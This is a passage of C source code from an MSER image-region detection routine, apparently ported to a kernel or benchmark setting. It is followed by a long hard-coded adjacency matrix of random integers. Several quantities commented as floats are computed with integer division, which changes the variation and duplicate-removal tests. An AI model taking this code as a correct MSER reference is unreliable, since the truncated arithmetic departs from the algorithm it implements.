           need to update it after each merge */

        /* find the root of the current node */
        /* also update the shortcuts */
        nvisited = 0;
        while (forest_pt[rindex].shortcut != rindex) {
          sref(visited_pt, nvisited++) = rindex;
          rindex = forest_pt[rindex].shortcut;
        }
        while (nvisited--) {
          forest_pt[sref(visited_pt, nvisited)].shortcut = rindex;
        }

        /* find the root of the neighbor */
        nrindex = nindex;
        nvisited = 0;
        while (forest_pt[nrindex].shortcut != nrindex) {
          sref(visited_pt, nvisited++) = nrindex;
          nrindex = forest_pt[nrindex].shortcut;
        }
        while (nvisited--) {
          forest_pt[sref(visited_pt, nvisited)].shortcut = nrindex;
        }

        /*
          Now we join the two subtrees rooted at

          RINDEX = ROOT(INDEX) and NRINDEX = ROOT(NINDEX).

          Only three things can happen:

          a - ROOT(INDEX) == ROOT(NRINDEX). In this case the two trees
          have already been joined and we do not do anything.

          b - I(ROOT(INDEX)) == I(ROOT(NRINDEX)). In this case index
          is extending an extremal region with the same
          value. Since ROOT(NRINDEX) will NOT be an extremal
          region of the full image, ROOT(INDEX) can be safely
          addedd as children of ROOT(NRINDEX) if this reduces
          the height according to union rank.

          c - I(ROOT(INDEX)) > I(ROOT(NRINDEX)) as index is extending
          an extremal region, but increasing its level. In this
          case ROOT(NRINDEX) WILL be an extremal region of the
          final image and the only possibility is to add
          ROOT(NRINDEX) as children of ROOT(INDEX).
        */

        if (rindex != nrindex) {
          /* this is a genuine join */

          nrvalue = asubsref(I_pt, nrindex);
          if (nrvalue == value
#ifdef USE_RANK_UNION
              && height < nheight
#endif
          ) {
            /* ROOT(INDEX) becomes the child */
            forest_pt[rindex].parent = nrindex;
            forest_pt[rindex].shortcut = nrindex;
            forest_pt[nrindex].area += forest_pt[rindex].area;

#ifdef USE_RANK_UNION
            forest_pt[nrindex].height = MAX(nheight, height + 1);
#endif

            sref(joins_pt, njoins++) = rindex;

          } else {
            /* ROOT(index) becomes parent */
            forest_pt[nrindex].parent = rindex;
            forest_pt[nrindex].shortcut = rindex;
            forest_pt[rindex].area += forest_pt[nrindex].area;

#ifdef USE_RANK_UNION
            forest_pt[rindex].height = MAX(height, nheight + 1);
#endif
            if (nrvalue != value) {
              /* nrindex is extremal region: save for later */
              forest_pt[nrindex].region = ner;
              regions_pt[ner].index = nrindex;
              regions_pt[ner].parent = ner;
              regions_pt[ner].value = nrvalue;
              regions_pt[ner].area = forest_pt[nrindex].area;
              regions_pt[ner].area_top = nel;
              regions_pt[ner].area_bot = 0;
              ++ner;
            }

            /* annote join operation for post-processing */
            sref(joins_pt, njoins++) = nrindex;
          }
        }

      } /* neighbor done */

      /* move to next neighbor */
      k = 0;
      sref(nsubs_pt, k) = sref(nsubs_pt, k) + 1;
      while (sref(nsubs_pt, k) > 1) {
        sref(nsubs_pt, k++) = -1;
        if (k == ndims)
          goto done_all_neighbors;
        sref(nsubs_pt, k) = sref(nsubs_pt, k) + 1;
      }
    } /* next neighbor */
  done_all_neighbors:;
  } /* next pixel */

  /* the root of the last processed pixel must be a region */
  forest_pt[rindex].region = ner;
  regions_pt[ner].index = rindex;
  regions_pt[ner].parent = ner;
  regions_pt[ner].value = asubsref(I_pt, rindex);
  regions_pt[ner].area = forest_pt[rindex].area;
  regions_pt[ner].area_top = nel;
  regions_pt[ner].area_bot = 0;
  ++ner;

  /* -----------------------------------------------------------------
   *                                            Compute region parents
   * -------------------------------------------------------------- */
  for (i = 0; i < ner; ++i) {
    idx_t index = regions_pt[i].index;
    val_t value = regions_pt[i].value;
    idx_t j = i;

    while (j == i) {
      idx_t pindex = forest_pt[index].parent;
      val_t pvalue = asubsref(I_pt, pindex);

      /* top of the tree */
      if (index == pindex) {
        j = forest_pt[index].region;
        break;
      }

      /* if index is the root of a region, either this is still
         i, or it is the parent region we are looking for. */
      if (value < pvalue) {
        j = forest_pt[index].region;
      }

      index = pindex;
      value = pvalue;
    }
    regions_pt[i].parent = j;
  }

  /* -----------------------------------------------------------------
   *                                 Compute areas of tops and bottoms
   * -------------------------------------------------------------- */

  /* We scan the list of regions from the bottom. Let x0 be the current
     region and be x1 = PARENT(x0), x2 = PARENT(x1) and so on.

     Here we do two things:

     1) Look for regions x for which x0 is the BOTTOM. This requires
     VAL(x0) <= VAL(x) - DELTA < VAL(x1).
     We update AREA_BOT(x) for each of such x found.

     2) Look for the region y which is the TOP of x0. This requires
     VAL(y) <= VAL(x0) + DELTA < VAL(y+1)
     We update AREA_TOP(x0) as soon as we find such y.

  */

  for (i = 0; i < ner; ++i) {
    /* fix xi as the region, then xj are the parents */
    idx_t parent = regions_pt[i].parent;
    int val0 = regions_pt[i].value;
    int val1 = regions_pt[parent].value;
    int val = val0;
    idx_t j = i;

    while (1) {
      int valp = regions_pt[parent].value;

      /* i is the bottom of j */
      if (val0 <= val - delta && val - delta < val1) {
        regions_pt[j].area_bot =
            MAX(regions_pt[j].area_bot, regions_pt[i].area);
      }

      /* j is the top of i */
      if (val <= val0 + delta && val0 + delta < valp) {
        regions_pt[i].area_top = regions_pt[j].area;
      }

      /* stop if going on is useless */
      if (val1 <= val - delta && val0 + delta < val)
        break;

      /* stop also if j is the root */
      if (j == parent)
        break;

      /* next region upward */
      j = parent;
      parent = regions_pt[j].parent;
      val = valp;
    }
  }

  /* -----------------------------------------------------------------
   *                                                 Compute variation
   * -------------------------------------------------------------- */
  for (i = 0; i < ner; ++i) {
    int area = regions_pt[i].area;
    int area_top = regions_pt[i].area_top;
    int area_bot = regions_pt[i].area_bot;
    regions_pt[i].variation = (area_top - area_bot) / (int)(area * 1);

    /* initialize .mastable to 1 for all nodes */
    regions_pt[i].maxstable = 1;
  }

  /* -----------------------------------------------------------------
   *                     Remove regions which are NOT maximally stable
   * -------------------------------------------------------------- */
  nmer = ner;
  for (i = 0; i < ner; ++i) {
    idx_t parent = regions_pt[i].parent;
    int var = regions_pt[i].variation;       // float
    int pvar = regions_pt[parent].variation; // float
    idx_t loser;

    /* decide which one to keep and put that in loser */
    if (var < pvar)
      loser = parent;
    else
      loser = i;

    /* make loser NON maximally stable */
    if (regions_pt[loser].maxstable)
      --nmer;
    regions_pt[loser].maxstable = 0;
  }

  /* -----------------------------------------------------------------
   *                                               Remove more regions
   * -------------------------------------------------------------- */

  /* it is critical for correct duplicate detection to remove regions
     from the bottom (smallest one first) */

  if (big_cleanup || small_cleanup || bad_cleanup || dup_cleanup) {
    int nbig = 0;
    int nsmall = 0;
    int nbad = 0;
    int ndup = 0;

    /* scann all extremal regions */
    for (i = 0; i < ner; ++i) {

      /* process only maximally stable extremal regions */
      if (!regions_pt[i].maxstable)
        continue;

      if (bad_cleanup && regions_pt[i].variation >= 1) {
        ++nbad;
        goto remove_this_region;
      }

      if (big_cleanup && regions_pt[i].area > nel / 2) {
        ++nbig;
        goto remove_this_region;
      }

      if (small_cleanup && regions_pt[i].area < 25) {
        ++nsmall;
        goto remove_this_region;
      }

      /** Remove duplicates */

      if (dup_cleanup) {
        idx_t parent = regions_pt[i].parent;
        int area, parea;
        int change; // float

        /* the search does not apply to root regions */
        if (parent != i) {

          // search for the maximally stable parent region
          while (!regions_pt[parent].maxstable) {
            idx_t next = regions_pt[parent].parent;
            if (next == parent)
              break;
            parent = next;
          }

          /* compare with the parent region; if the current and parent
             regions are too similar, keep only the parent */

          area = regions_pt[i].area;
          parea = regions_pt[parent].area;
          change = (parea - area) / (area * 1);

          if (change < 0.5) {
            ++ndup;
            goto remove_this_region;
          }

        } /* drop duplicates */
      }

      continue;
    remove_this_region:
      regions_pt[i].maxstable = 0;
      --nmer;

    } /* next region to cleanup */

    if (0) {
      // printk("  Bad regions:        %d\n", nbad   ) ;
      // printk("  Small regions:      %d\n", nsmall ) ;
      // printk("  Big regions:        %d\n", nbig   ) ;
      // printk("  Duplicated regions: %d\n", ndup   ) ;
    }
  }

  /*    printf("Cleaned-up regions: %d (%.1f%%)\n",
            nmer, 100.0 * (double) nmer / ner) ;
  */
  /* -----------------------------------------------------------------
   *                                                      Fit ellipses
   * -------------------------------------------------------------- */
  ell_pt = 0;
  if (nout >= 1) {
    int midx = 1;
    int d, index, j;

    /* enumerate maxstable regions */
    for (i = 0; i < ner; ++i) {
      if (!regions_pt[i].maxstable)
        continue;
      regions_pt[i].maxstable = midx++;
    }

    /* allocate space */

    // printf("ulliArray %d %d \n", sizeof(ulliArray), sizeof(acc_t)*nel);
    // printf("ulliArray %d %d \n", sizeof(ulliArray), sizeof(acc_t)*gdl*nmer);

    acc_pt =
        (ulliArray *)sacc_pt; // malloc(sizeof(ulliArray) + sizeof(acc_t)*nel) ;
    ell_pt = (ulliArray *)
        sell_pt; // malloc(sizeof(ulliArray) + sizeof(acc_t)*gdl*nmer) ;

    /* clear accumulators */
    for (d = 0; d < (gdl * nmer); d++)
      sref(ell_pt, d) = 0;

    /* for each gdl */
    for (d = 0; d < gdl; ++d) {
      /* initalize parameter */
      int counter_i;
      for (counter_i = 0; counter_i < ndims; counter_i++)
        sref(subs_pt, counter_i) = 0;

      if (d < ndims) {
        for (index = 0; index < nel; ++index) {
          sref(acc_pt, index) = sref(subs_pt, d);
          adv(dims, ndims, subs_pt);
        }
      } else {
        /* decode d-ndims into a (i,j) pair */
        i = d - ndims;
        j = 0;
        while (i > j) {
          i -= j + 1;
          j++;
        }

        /* add x_i * x_j */
        for (index = 0; index < nel; ++index) {
          sref(acc_pt, index) = sref(subs_pt, i) * sref(subs_pt, j);
          adv(dims, ndims, subs_pt);
        }
      }

      /* integrate parameter */
      for (i = 0; i < njoins; ++i) {
        idx_t index = sref(joins_pt, i);
        idx_t parent = forest_pt[index].parent;
        sref(acc_pt, parent) += sref(acc_pt, index);
      }

      /* save back to ellpises */
      for (i = 0; i < ner; ++i) {
        idx_t region = regions_pt[i].maxstable;

        /* skip if not extremal region */
        if (region-- == 0)
          continue;
        sref(ell_pt, d + gdl * region) = sref(acc_pt, regions_pt[i].index);
      }

      /* next gdl */
    }
    // free(acc_pt) ;
    // free(ell_pt) ;
  }

  /* -----------------------------------------------------------------
   *                                                Save back and exit
   * -------------------------------------------------------------- */

  /*
   * Save extremal regions
   */
  {
    int /*dims[2],*/ j = 0;
    I2D *pt;
    // dims[0] = nmer ;

    // printf("value %d \n", nmer);
    out = (I2D *)spt; // iMallocHandle(1, nmer);

    out->height = 1;
    out->width = nmer;

    pt = out;
    for (i = 0; i < ner; ++i) {
      if (regions_pt[i].maxstable) {
        /* adjust for MATLAB index compatibility */
        //                *pt++ = regions_pt[i].index + 1 ;
        asubsref(pt, j++) = regions_pt[i].index + 1;
      }
    }
  }

  /* free stuff */
  /*free(dims);
    free( forest_pt  ) ;
    free( pairs_pt   ) ;
    free( regions_pt ) ;
    free( visited_pt ) ;
    free( strides_pt ) ;
    free( nsubs_pt   ) ;
    free( subs_pt    ) ;
    free( joins_pt    ) ;*/

  // printf("RET\n");
  return out;
}

int AdjMatrix[666][NUM_NODES] = {
    {32, 98, 11, 71, 49, 80, 82, 1, 52, 23},
    {80, 66, 45, 55, 43, 48, 76, 80, 40, 31},
    {7, 91, 95, 93, 31, 38, 20, 1, 0, 88},
    {84, 32, 51, 95, 2, 100, 40, 85, 1, 59},
    {74, 47, 91, 18, 68, 33, 67, 9, 80, 73},
    {6, 53, 29, 1, 46, 60, 5, 32, 61, 5},
    {86, 11, 3, 36, 72, 6, 36, 12, 57, 37},
    {71, 97, 50, 61, 14, 17, 61, 47, 93, 6},
    {20, 99, 25, 15, 66, 37, 76, 71, 36, 2},
    {42, 21, 80, 12, 58, 52, 18, 94, 30, 41},
    {97, 67, 3, 12, 94, 17, 96, 54, 31, 88},
    {26, 51, 86, 18, 66, 52, 55, 7, 89, 91},
    {77, 98, 79, 56, 9, 36, 74, 94, 96, 3},
    {34, 92, 70, 37, 3, 64, 20, 65, 84, 51},
    {52, 77, 68, 37, 95, 0, 55, 15, 7, 10},
    {6, 50, 7, 85, 73, 16, 87, 46, 9, 82},
    {50, 9, 39, 86, 12, 8, 49, 32, 73, 100},
    {50, 24, 76, 17, 27, 70, 17, 83, 51, 92},
    {93, 23, 7, 66, 74, 80, 82, 60, 26, 57},
    {41, 42, 66, 80, 27, 78, 88, 77, 76, 26},
    {42, 25, 50, 17, 9, 78, 53, 26, 26, 3},
    {84, 85, 27, 92, 50, 0, 71, 31, 27, 63},
    {88, 34, 4, 19, 14, 32, 97, 68, 75, 72},
    {95, 16, 64, 10, 100, 73, 88, 52, 65, 80},
    {21, 49, 64, 14, 6, 13, 15, 77, 10, 8},
    {6, 64, 42, 10, 83, 22, 8, 45, 91, 49},
    {84, 51, 65, 47, 27, 30, 86, 82, 82, 50},
    {61, 70, 65, 92, 84, 71, 71, 65, 14, 82},
    {73, 20, 11, 15, 97, 61, 37, 5, 72, 94},
    {54, 55, 10, 86, 68, 38, 15, 53, 19, 64},
    {70, 80, 33, 34, 37, 16, 72, 8, 82, 86},
    {56, 54, 5, 33, 69, 1, 94, 73, 73, 66},
    {66, 27, 87, 77, 79, 55, 14, 94, 74, 100},
    {57, 43, 45, 90, 44, 83, 73, 15, 91, 54},
    {0, 46, 74, 72, 79, 9, 39, 39, 82, 12},
    {71, 13, 5, 57, 90, 84, 11, 70, 77, 52},
    {69, 0, 95, 14, 56, 38, 63, 28, 19, 53},
    {48, 19, 65, 89, 57, 9, 98, 97, 14, 45},
    {8, 85, 58, 80, 42, 14, 63, 19, 50, 5},
    {71, 86, 72, 66, 66, 28, 70, 28, 56, 90},
    {81, 71, 75, 11, 59, 32, 87, 56, 28, 1},
    {67, 2, 86, 91, 82, 27, 71, 10, 47, 21},
    {82, 17, 6, 54, 49, 38, 82, 86, 66, 3},
    {75, 12, 74, 15, 23, 99, 47, 9, 20, 75},
    {10, 87, 43, 63, 44, 91, 90, 14, 0, 2},
    {35, 83, 87, 7, 2, 1, 45, 84, 87, 77},
    {53, 27, 89, 94, 43, 78, 92, 90, 88, 12},
    {31, 64, 65, 74, 93, 8, 65, 49, 23, 31},
    {51, 24, 80, 3, 99, 82, 5, 9, 31, 92},
    {87, 85, 19, 41, 78, 62, 19, 35, 17, 73},
    {13, 48, 2, 79, 89, 96, 53, 19, 44, 42},
    {50, 61, 67, 30, 65, 31, 78, 36, 40, 9},
    {94, 93, 60, 12, 34, 3, 40, 53, 38, 24},
    {92, 52, 72, 94, 97, 60, 89, 15, 79, 99},
    {58, 96, 26, 91, 92, 91, 21, 69, 93, 27},
    {44, 86, 20, 3, 65, 54, 6, 71, 73, 11},
    {95, 64, 29, 67, 23, 92, 93, 79, 6, 38},
    {77, 30, 33, 2, 20, 91, 59, 7, 59, 51},
    {1, 3, 3, 21, 73, 68, 41, 46, 4, 80},
    {57, 100, 9, 86, 32, 32, 43, 24, 10, 49},
    {28, 88, 80, 27, 56, 66, 17, 82, 40, 77},
    {32, 41, 46, 1, 28, 85, 35, 69, 30, 40},
    {14, 53, 39, 23, 4, 71, 55, 47, 61, 66},
    {97, 56, 19, 42, 83, 41, 74, 0, 22, 80},
    {77, 21, 20, 89, 22, 14, 73, 58, 83, 70},
    {98, 63, 22, 2, 86, 27, 39, 41, 40, 66},
    {73, 36, 21, 92, 44, 4, 32, 85, 4, 21},
    {64, 47, 42, 85, 1, 64, 65, 40, 88, 48},
    {9, 51, 77, 99, 53, 63, 92, 58, 3, 31},
    {24, 76, 34, 11, 33, 44, 15, 31, 28, 86},
    {52, 93, 99, 94, 43, 100, 24, 7, 40, 11},
    {21, 15, 63, 99, 13, 82, 61, 4, 40, 30},
    {2, 30, 72, 36, 41, 71, 80, 23, 1, 8},
    {69, 77, 6, 69, 51, 10, 52, 54, 26, 72},
    {67, 0, 85, 80, 11, 37, 34, 48, 81, 93},
    {97, 97, 29, 16, 14, 96, 30, 7, 55, 56},
    {34, 90, 99, 6, 58, 50, 16, 76, 70, 8},
    {47, 3, 9, 32, 49, 87, 69, 83, 35, 16},
    {75, 98, 79, 3, 13, 93, 65, 44, 100, 86},
    {66, 100, 75, 65, 5, 33, 81, 88, 75, 16},
    {97, 22, 86, 72, 54, 35, 58, 89, 17, 59},
    {71, 59, 56, 49, 28, 70, 41, 60, 80, 40},
    {45, 11, 5, 20, 42, 10, 19, 22, 99, 94},
    {5, 61, 82, 91, 32, 1, 25, 90, 57, 9},
    {49, 27, 34, 71, 43, 62, 40, 50, 21, 86},
    {91, 33, 98, 62, 53, 39, 73, 38, 28, 37},
    {98, 33, 98, 80, 90, 29, 47, 82, 85, 3},
    {57, 100, 98, 91, 71, 40, 18, 77, 90, 6},
    {63, 46, 39, 26, 8, 58, 31, 47, 96, 59},
    {84, 59, 58, 47, 38, 48, 76, 52, 96, 26},
    {55, 52, 26, 52, 42, 63, 58, 26, 5, 48},
    {32, 68, 60, 37, 60, 68, 95, 92, 14, 56},
    {16, 64, 15, 75, 10, 19, 89, 52, 71, 84},
    {79, 26, 1, 71, 44, 43, 100, 2, 35, 4},
    {16, 68, 39, 76, 4, 99, 10, 100, 56, 91},
    {21, 73, 55, 36, 13, 31, 56, 1, 84, 93},
    {51, 28, 85, 52, 65, 29, 61, 64, 98, 96},
    {68, 13, 29, 73, 55, 34, 38, 65, 100, 94},
    {56, 87, 32, 77, 23, 45, 7, 45, 12, 91},
    {37, 29, 85, 22, 47, 49, 17, 74, 12, 14},
    {70, 47, 94, 65, 86, 48, 99, 23, 13, 64},
    {84, 35, 51, 15, 11, 40, 27, 18, 51, 5},
    {76, 88, 1, 26, 76, 48, 76, 59, 22, 54},
    {73, 58, 67, 32, 22, 53, 81, 88, 76, 60},
    {17, 25, 95, 34, 7, 5, 40, 34, 90, 91},
    {5, 31, 45, 6, 58, 20, 21, 33, 80, 9},
    {53, 18, 67, 20, 51, 55, 73, 31, 42, 14},
    {57, 26, 40, 51, 60, 13, 22, 0, 47, 78},
    {91, 18, 9, 1, 92, 33, 22, 79, 32, 68},
    {88, 85, 86, 20, 71, 2, 75, 43, 100, 84},
    {24, 56, 9, 30, 6, 35, 43, 95, 1, 56},
    {73, 59, 40, 48, 60, 31, 81, 82, 9, 12},
    {15, 97, 63, 1, 83, 34, 70, 58, 43, 70},
    {41, 67, 25, 16, 63, 99, 17, 5, 93, 19},
    {27, 31, 78, 68, 79, 37, 99, 59, 86, 75},
    {37, 0, 37, 67, 68, 20, 0, 38, 78, 43},
    {7, 85, 77, 99, 67, 39, 97, 84, 11, 90},
    {2, 38, 20, 46, 5, 100, 50, 71, 24, 35},
    {45, 28, 1, 82, 95, 36, 68, 61, 40, 11},
    {70, 47, 62, 46, 11, 28, 52, 8, 79, 63},
    {98, 81, 67, 84, 94, 39, 49, 43, 9, 40},
    {78, 20, 68, 45, 68, 28, 81, 36, 89, 20},
    {47, 58, 33, 9, 71, 45, 37, 22, 53, 82},
    {51, 16, 29, 84, 100, 22, 22, 15, 65, 98},
    {55, 8, 17, 22, 19, 86, 16, 0, 21, 4},
    {87, 34, 28, 20, 43, 99, 31, 47, 87, 50},
    {28, 3, 66, 57, 88, 31, 45, 76, 46, 9},
    {74, 0, 84, 91, 89, 3, 42, 4, 3, 63},
    {8, 56, 98, 3, 76, 6, 1, 73, 53, 55},
    {22, 48, 58, 54, 71, 11, 86, 16, 88, 98},
    {92, 61, 99, 76, 17, 53, 79, 60, 58, 48},
    {89, 32, 3, 52, 35, 46, 59, 3, 18, 78},
    {24, 7, 92, 48, 61, 63, 60, 12, 79, 47},
    {10, 70, 74, 75, 11, 91, 27, 90, 16, 51},
    {3, 5, 84, 74, 57, 85, 19, 15, 54, 3},
    {60, 44, 10, 51, 93, 38, 13, 52, 50, 58},
    {65, 60, 28, 38, 34, 39, 95, 28, 96, 11},
    {79, 99, 16, 28, 38, 73, 80, 57, 55, 100},
    {27, 14, 44, 3, 65, 36, 41, 79, 54, 92},
    {2, 18, 17, 30, 56, 18, 36, 50, 46, 98},
    {27, 24, 62, 43, 19, 0, 83, 99, 23, 37},
    {98, 50, 51, 41, 20, 82, 43, 61, 26, 97},
    {18, 29, 14, 2, 25, 36, 20, 61, 53, 66},
    {24, 80, 56, 87, 90, 41, 87, 72, 39, 9},
    {8, 3, 26, 25, 44, 46, 73, 54, 73, 100},
    {50, 58, 95, 31, 60, 19, 67, 80, 47, 86},
    {11, 71, 32, 33, 23, 21, 75, 9, 93, 80},
    {86, 67, 83, 11, 58, 94, 23, 30, 47, 96},
    {96, 63, 19, 56, 94, 79, 42, 27, 24, 89},
    {12, 1, 25, 44, 35, 49, 65, 76, 58, 23},
    {21, 9, 90, 4, 87, 13, 64, 9, 10, 77},
    {72, 72, 39, 91, 28, 33, 70, 70, 60, 60},
    {24, 72, 62, 49, 83, 63, 64, 47, 4, 89},
    {37, 25, 98, 26, 96, 85, 6, 25, 94, 16},
    {1, 31, 54, 41, 22, 48, 74, 58, 17, 100},
    {17, 7, 71, 45, 57, 19, 74, 20, 67, 78},
    {75, 3, 70, 73, 96, 65, 57, 68, 57, 16},
    {50, 58, 14, 4, 99, 36, 52, 38, 60, 36},
    {37, 43, 43, 75, 89, 66, 94, 62, 53, 60},
    {6, 27, 29, 76, 100, 92, 6, 22, 59, 63},
    {5, 9, 21, 19, 13, 86, 21, 31, 24, 47},
    {67, 61, 90, 10, 35, 44, 42, 29, 73, 95},
    {55, 79, 22, 51, 54, 88, 42, 26, 10, 0},
    {56, 82, 9, 77, 67, 89, 28, 88, 20, 52},
    {34, 53, 80, 90, 29, 14, 34, 72, 9, 6},
    {66, 65, 85, 54, 82, 4, 42, 23, 97, 18},
    {23, 52, 100, 100, 95, 66, 54, 23, 19, 40},
    {75, 19, 60, 20, 8, 89, 35, 42, 60, 10},
    {48, 93, 41, 99, 46, 22, 69, 54, 45, 66},
    {38, 35, 17, 37, 0, 12, 69, 54, 35, 54},
    {61, 76, 73, 20, 97, 48, 8, 98, 90, 35},
    {7, 4, 94, 15, 69, 5, 37, 38, 60, 83},
    {3, 98, 84, 20, 1, 84, 99, 36, 3, 100},
    {57, 64, 76, 96, 50, 38, 43, 25, 35, 100},
    {60, 8, 70, 53, 23, 38, 58, 27, 42, 84},
    {76, 11, 48, 59, 99, 15, 8, 97, 51, 11},
    {97, 7, 42, 38, 70, 58, 76, 12, 83, 77},
    {11, 42, 51, 47, 61, 75, 86, 86, 68, 94},
    {69, 43, 5, 16, 1, 3, 31, 9, 100, 49},
    {87, 62, 22, 95, 100, 92, 53, 41, 71, 35},
    {17, 48, 44, 69, 96, 4, 9, 47, 56, 77},
    {40, 25, 86, 45, 7, 87, 48, 5, 62, 14},
    {20, 48, 76, 8, 43, 76, 67, 62, 16, 37},
    {97, 0, 85, 6, 35, 80, 78, 10, 26, 33},
    {53, 33, 24, 38, 78, 32, 24, 93, 3, 52},
    {6, 90, 100, 48, 98, 8, 90, 64, 70, 6},
    {67, 33, 73, 52, 39, 7, 98, 16, 84, 91},
    {16, 36, 23, 40, 74, 67, 38, 64, 59, 41},
    {15, 31, 97, 81, 80, 61, 56, 35, 24, 25},
    {41, 92, 24, 80, 9, 30, 53, 6, 12, 36},
    {97, 28, 72, 86, 69, 11, 53, 6, 75, 78},
    {14, 56, 76, 10, 37, 55, 37, 93, 56, 62},
    {84, 98, 19, 75, 43, 28, 4, 97, 0, 83},
    {46, 50, 23, 23, 42, 85, 23, 55, 68, 54},
    {29, 44, 40, 0, 41, 51, 14, 42, 66, 68},
    {84, 36, 31, 10, 53, 30, 45, 30, 6, 85},
    {25, 53, 1, 14, 42, 43, 65, 66, 65, 32},
    {86, 94, 42, 25, 95, 83, 42, 8, 91, 74},
    {42, 40, 10, 74, 51, 63, 70, 62, 59, 77},
    {47, 50, 96, 48, 64, 3, 57, 28, 35, 21},
    {26, 20, 15, 68, 12, 9, 16, 54, 84, 74},
    {28, 92, 13, 4, 65, 30, 33, 1, 93, 93},
    {78, 5, 42, 39, 53, 73, 42, 9, 0, 78},
    {98, 94, 98, 12, 61, 76, 88, 44, 30, 37},
    {17, 24, 28, 97, 28, 60, 27, 61, 27, 86},
    {53, 4, 91, 62, 9, 9, 34, 17, 85, 0},
    {61, 82, 94, 25, 60, 21, 0, 13, 65, 30},
    {50, 48, 54, 45, 44, 48, 71, 37, 9, 98},
    {89, 62, 68, 45, 23, 43, 54, 23, 60, 5},
    {24, 21, 87, 17, 12, 13, 4, 12, 26, 69},
    {9, 43, 83, 29, 88, 94, 78, 24, 30, 87},
    {21, 86, 14, 55, 30, 4, 98, 51, 27, 57},
    {56, 17, 44, 8, 35, 56, 21, 39, 69, 14},
    {75, 44, 57, 23, 73, 10, 16, 50, 34, 13},
    {2, 55, 99, 17, 9, 95, 21, 6, 45, 14},
    {29, 0, 32, 74, 9, 33, 96, 97, 38, 30},
    {10, 79, 74, 33, 2, 47, 43, 85, 63, 77},
    {98, 66, 98, 62, 83, 73, 57, 70, 45, 68},
    {50, 75, 69, 82, 14, 44, 81, 9, 6, 19},
    {40, 84, 64, 80, 16, 66, 26, 60, 51, 90},
    {83, 15, 61, 64, 95, 10, 95, 34, 70, 57},
    {85, 78, 76, 73, 55, 66, 47, 83, 80, 60},
    {16, 16, 9, 80, 92, 96, 10, 77, 14, 9},
    {28, 63, 91, 56, 93, 85, 32, 87, 18, 68},
    {43, 70, 45, 19, 42, 66, 85, 56, 48, 31},
    {82, 30, 47, 92, 9, 4, 87, 87, 81, 67},
    {96, 76, 29, 87, 31, 89, 37, 63, 75, 22},
    {97, 85, 92, 41, 70, 100, 73, 20, 55, 20},
    {51, 37, 17, 64, 28, 93, 68, 81, 79, 15},
    {47, 75, 91, 42, 27, 88, 30, 64, 16, 72},
    {52, 12, 56, 43, 19, 25, 43, 92, 45, 64},
    {78, 63, 0, 95, 26, 95, 54, 61, 75, 32},
    {76, 88, 73, 32, 30, 66, 86, 26, 97, 1},
    {98, 48, 80, 19, 92, 99, 10, 0, 56, 56},
    {64, 33, 85, 65, 95, 77, 59, 48, 3, 0},
    {46, 45, 88, 19, 77, 84, 51, 62, 10, 47},
    {29, 74, 96, 8, 94, 53, 73, 3, 53, 28},
    {25, 16, 62, 76, 47, 22, 53, 73, 70, 22},
    {73, 15, 68, 60, 0, 10, 44, 52, 73, 54},
    {65, 68, 94, 60, 77, 53, 79, 15, 23, 31},
    {44, 48, 14, 72, 91, 27, 94, 9, 100, 29},
    {31, 72, 44, 99, 32, 11, 9, 76, 29, 48},
    {96, 94, 15, 55, 20, 58, 8, 99, 40, 31},
    {97, 84, 45, 77, 55, 35, 3, 14, 44, 3},
    {43, 42, 75, 87, 40, 73, 64, 15, 14, 93},
    {29, 76, 53, 11, 31, 73, 69, 39, 37, 8},
    {70, 100, 58, 81, 76, 79, 16, 80, 93, 26},
    {49, 35, 68, 23, 89, 75, 63, 18, 56, 77},
    {11, 86, 53, 30, 97, 84, 2, 31, 89, 5},
    {6, 24, 5, 64, 4, 47, 43, 87, 26, 1},
    {13, 41, 3, 47, 65, 92, 88, 94, 9, 44},
    {70, 87, 29, 89, 16, 25, 72, 85, 56, 26},
    {57, 62, 50, 62, 93, 55, 8, 1, 7, 1},
    {2, 20, 42, 5, 34, 73, 63, 21, 66, 39},
    {31, 2, 25, 60, 91, 8, 51, 29, 59, 74},
    {55, 15, 1, 5, 77, 94, 26, 52, 95, 33},
    {19, 64, 20, 27, 35, 54, 0, 99, 41, 32},
    {37, 73, 34, 28, 99, 92, 2, 50, 20, 62},
    {23, 75, 77, 24, 46, 20, 85, 72, 38, 45},
    {72, 57, 75, 92, 84, 10, 11, 50, 75, 18},
    {83, 78, 91, 83, 72, 56, 74, 75, 72, 60},
    {36, 95, 1, 79, 85, 47, 99, 35, 19, 36},
    {47, 91, 59, 21, 48, 43, 31, 59, 59, 72},
    {77, 7, 49, 34, 91, 21, 56, 30, 96, 27},
    {57, 98, 88, 58, 76, 38, 4, 41, 74, 90},
    {43, 20, 46, 2, 7, 94, 11, 39, 18, 70},
    {77, 62, 78, 26, 62, 34, 47, 17, 30, 8},
    {10, 87, 72, 98, 44, 47, 1, 15, 54, 75},
    {4, 98, 61, 17, 100, 69, 10, 10, 74, 96},
    {4, 16, 34, 22, 54, 43, 11, 10, 62, 37},
    {37, 8, 4, 22, 99, 57, 83, 30, 4, 86},
    {55, 89, 49, 46, 0, 38, 38, 77, 74, 49},
    {97, 79, 66, 97, 0, 86, 5, 79, 62, 33},
    {15, 65, 41, 87, 87, 6, 9, 35, 2, 14},
    {21, 57, 69, 36, 3, 35, 40, 7, 11, 13},
    {23, 74, 92, 55, 36, 93, 40, 42, 37, 68},
    {75, 18, 32, 83, 71, 85, 89, 81, 19, 91},
    {61, 6, 13, 29, 8, 16, 65, 48, 91, 76},
    {62, 80, 16, 19, 34, 52, 78, 74, 94, 14},
    {7, 69, 33, 5, 17, 3, 56, 5, 84, 41},
    {62, 44, 48, 75, 40, 56, 58, 71, 71, 14},
    {12, 99, 94, 28, 17, 27, 81, 96, 67, 74},
    {76, 74, 8, 75, 45, 25, 79, 0, 97, 28},
    {41, 58, 39, 55, 100, 45, 11, 23, 15, 48},
    {37, 27, 46, 97, 56, 63, 90, 36, 24, 56},
    {76, 0, 96, 85, 41, 40, 9, 19, 6, 6},
    {14, 47, 30, 19, 2, 96, 64, 80, 18, 45},
    {27, 21, 72, 39, 17, 94, 1, 6, 96, 93},
    {28, 72, 59, 90, 56, 100, 96, 31, 86, 1},
    {3, 66, 15, 0, 85, 17, 96, 14, 63, 81},
    {59, 90, 1, 97, 28, 19, 57, 96, 92, 52},
    {54, 87, 23, 12, 76, 45, 79, 72, 43, 64},
    {39, 46, 29, 54, 12, 80, 37, 8, 60, 100},
    {89, 85, 55, 56, 47, 49, 75, 3, 45, 33},
    {56, 99, 19, 45, 78, 61, 91, 56, 99, 33},
    {86, 4, 45, 81, 58, 58, 60, 96, 32, 19},
    {61, 87, 70, 16, 42, 16, 65, 84, 20, 76},
